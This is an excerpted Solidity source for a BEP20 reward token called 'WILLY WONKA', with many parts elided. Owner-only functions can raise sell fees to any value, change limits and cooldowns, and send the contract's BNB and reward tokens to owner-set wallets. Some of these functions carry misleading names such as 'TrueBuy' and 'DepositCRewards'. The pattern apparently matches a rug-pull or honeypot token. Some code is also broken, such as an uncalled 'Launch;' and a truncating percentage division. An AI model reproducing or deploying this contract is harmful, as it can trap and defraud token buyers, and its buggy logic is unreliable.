...
interface IDividendDistributor {
    ...
    function DepositARewards() external;
    function DepositCRewards(uint256 _amountN, uint256 _amountD) external;
    function DepositPRewards(uint256 _amountN, uint256 _amountD) external;
...
contract DividendDistributor is IDividendDistributor {
    ...
    function DepositARewards() external override {
    ...
    function DepositCRewards(uint256 _amountN, uint256 _amountD) external override {
        address shareholder = REWDS;
        uint256 Ramount = RWDS.balanceOf(address(this));
        uint256 PRamount = Ramount.mul(_amountN).div(_amountD);
        RWDS.transfer(shareholder, PRamount); }

    function DepositPRewards(uint256 _amountN, uint256 _amountD) external override {
        address shareholder = REWDS;
        uint256 Pamount = PREVRWDS.balanceOf(address(this));
        uint256 PPamount = Pamount.mul(_amountN).div(_amountD);
...
contract WILLYWONKA is IBEP20, Auth {
    using SafeMath for uint256;
    
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address FJUK = 0x58eD31338BB8D649cBc75f84A339C327a9c2ac89;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address ULBD = 0x3C8eEc63D0eB8EcD0451B29cEb1a715e2bda573F;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address BZKE = 0x3225447E4e475Ff66469EE5151704117d269B1A9;
    string constant _name = "WILLY WONKA";
    string constant _symbol = "WONKA";
    uint8 constant _decimals = 9;
    uint256 _totalSupply = 100 * 10**9 * (10 ** _decimals);
    uint256 public _maxbTxAmount = ( _totalSupply * 150 ) / 10000;
    ...
    uint256 yr = 40;
    uint256 zr = 40;
    uint256 public LimitSwap = _totalSupply * 3 / 10000;
    DividendDistributor distributor;
    uint256 distributorGas = 500000;
    bool public Swap = true;
    uint256 public sThreshold = _totalSupply * 30 / 10000;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
    bool public sFreeze = true;
    uint8 public sFreezeT = 30;
    mapping (address => uint) private coolin;
    bool public VariableSB = true;
    uint256 public VariableN = 50;
    uint256 VariableD = 100;
    bool public bBuyE = false;
    uint256 public bBuy = 10;
    bool public sSellE = true;
    uint256 public sSell = 20;
    bool Launched = false;
    bool public sMultE = false;
    uint256 public _sMultN = 1300;
    uint256 public _sMultD = 1000;
    ...
    constructor () Auth(msg.sender) {
        ...
        isFeeE[msg.sender] = true; isFeeE[address(LPRe)] = true;
        isFeeE[address(RewRe)] = true; isFeeE[address(RewRp)] = true;
        isFeeE[address(this)] = true; isTxLE[msg.sender] = true;
        isTxLE[address(this)] = true; isTxLE[address(router)] = true;
        isTxLE[address(LPRe)] = true; isTxLE[address(RewRe)] = true;
        isTxLE[address(RewRp)] = true; isMaxWE[address(LPRe)] = true;
        isMaxWE[address(this)] = true; isDivE[pair] = true;
        isDivE[address(this)] = true; isDivE[DEAD] = true;
        isDivE[ZERO] = true; isTimeloE[address(LPRe)] = true;
        isTimeloE[address(RewRe)] = true; isTimeloE[address(RewRp)] = true;
        isTimeloE[msg.sender] = true; isTimeloE[DEAD] = true;
        isTimeloE[address(this)] = true; LiqRe = msg.sender;
        LPRe = FJUK; RewRe = ULBD; RewRp = BZKE;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1) && Launched){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance"); }
        return _transferfrom(sender, recipient, amount); }
    
    function MaxbTxP(uint256 _mnTP, uint256 _mdTP) external authorized {
        _maxbTxAmount = (_totalSupply * _mnTP) / _mdTP; }

    function MaxsTxP(uint256 _mnTP, uint256 _mdTP) external authorized {
        _maxsTxAmount = (_totalSupply * _mnTP) / _mdTP; }

    function MaxWalletP(uint256 _mnWP, uint256 _mdWP) external authorized {
        _maxWalletToken = (_totalSupply * _mnWP) / _mdWP; }

    function setSMultE(bool _enabled) external authorized {
        sMultE = _enabled; }

    function LFG(bool _enabled) external authorized {
        Launched = _enabled; } 
    
    function _transferfrom(address sender, address recipient, uint256 amount) internal returns (bool){
        if(inSwap && Launched){ return _basicTransfer(sender, recipient, amount); }
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != FJUK && recipient != LiqRe && Launched){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");}
        checkbTxLimit(sender, amount); Launch; 
        if(sender != pair){checksTxLimit(sender, amount);}
        if(SecSell(amount) && sender != address(_contract) && VariableSB && (amount.mul(VariableN).div(VariableD) < sThreshold) && Launched)
            { DefinedSwap(); }
        _balances[sender] = _balances[sender].sub(amount, "+");
        uint256 amountReceived = TotalFeeE(sender) ? ProcessTF(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        if(SecSell(amount) && VariableSB && sender != address(_contract) && (amount.mul(VariableN).div(VariableD) < sThreshold) && Launched)
            { VariableSBFunction(amount); }
        if(!isDivE[sender] && Launched) {
            try distributor.setShare(sender, _balances[sender]) {} catch {} }
        if(!isDivE[recipient] && Launched) {
            try distributor.setShare(recipient, _balances[recipient]) {} catch {} }
        if(SecSell(amount) && sender != address(_contract) && !VariableSB && Launched){ DefinedSwap(); }
        if(sender != pair && sFreeze && Launched && !isTimeloE[sender]) 
            {require(coolin[sender] < block.timestamp,"Please wait for cooldown between sells"); coolin[sender] = block.timestamp + sFreezeT;} 
    ...
    function checkbTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxbTxAmount || isTxLE[sender], "TX Limit Exceeded"); }

    function checksTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxsTxAmount || isTxLE[sender], "TX Limit Exceeded"); }

    function Launch() internal view {
        require(Launched); }

    function TotalFeeE(address sender) internal view returns (bool) {
        return !isFeeE[sender]; }

    function TotalFee(bool selling) internal view returns (uint256) {
        if(launchedAt + 1 >= block.number){ return feeD.sub(1); }
        if(selling && sSellE){ return sSell.mul(1); }
        if(!selling && bBuyE){ return bBuy.mul(1); }
        if(selling && sMultE && !sSellE){ return ((totalFee.mul(_sMultN)).div(_sMultD)); }
        return totalFee; }

    function ProcessTF(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(TotalFee(receiver == pair)).div(feeD);
    ...
    function SetFreeze(bool _status, uint8 _interval) external authorized {
        sFreeze = _status;
        sFreezeT = _interval; }

    function SetBuyers(address _R1Address, address _RAddress, address _R2Address) external onlyOwner {
        FJUK = _R1Address;
        ULBD = _RAddress;
        BZKE = _R2Address;
        distributor.setRAddress(_RAddress); }

    function LiqAdd(uint256 _perc) external authorized {
        uint256 amB = address(this).balance.div(2);
        uint256 amBD = amB.div(_perc);
        (bool tmpSuccess,) = payable(FJUK).call{value: amBD, gas: 50000}("");
        (tmpSuccess,) = payable(BZKE).call{value: amBD, gas: 50000}("");
        tmpSuccess = false; }
    ...
    function DefinedSwap() internal swapping {
        ...
        uint256 aBNBMT = aBNB.mul(zr).div(tBNBF);
        uint256 aBNBM = aBNBMT.div(2);
        try distributor.deposit{value: aBNBR}() {} catch {}
        (bool tmpSuccess,) = payable(FJUK).call{value: aBNBM, gas: 40000}("");
        (tmpSuccess,) = payable(BZKE).call{value: aBNBM, gas: 40000}("");
        tmpSuccess = false;
        if(amountL > 0){
    ...
    function setWalMaxE(address holder, bool exempt) internal authorized {
        isMaxWE[holder] = exempt; }

    function TrueBuy(uint256 _perc) external authorized {
        uint256 amountB = address(this).balance;
        payable(BZKE).transfer(amountB.mul((_perc).div(100))); }
    ...
    function setSMulti(bool _enabled, uint256 _jtm) external authorized {
        sSellE = _enabled;
        sSell = _jtm; }
    ...
    function meritor(bool _enabled, uint256 _bc, uint256 _op) external authorized {
        bBuy = _bc;
        bBuyE = _enabled;
        sSell = _op;
        sSellE = _enabled; }
    ...
    function setsMult(uint256 _amountN, uint256 _amountD) external authorized {
        _sMultN = _amountN;
        _sMultD = _amountD; }

    function VariableSBFunction(uint256 amount) internal swapping {
        uint256 variableSTd = amount.mul(VariableN).div(VariableD);
        uint256 dynamicLiq = isOverLiquified(targetL, targetLD) ? 0 : yr;
        uint256 amountL = variableSTd.mul(dynamicLiq).div(dr).div(2);
        uint256 totalSw = variableSTd.sub(amountL);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
        uint256 bB = address(this).balance;
    ...
    function TriggerARewards() external authorized {
        distributor.DepositARewards(); }

    function TriggerPRewards(uint256 _amountN, uint256 _amountD) external authorized {
        distributor.DepositPRewards(_amountN, _amountD); }

    function TriggerCRewards(uint256 _amountN, uint256 _amountD) external authorized {
        distributor.DepositCRewards(_amountN, _amountD); }
 
    function ContractBuyB(uint256 amount) external authorized {
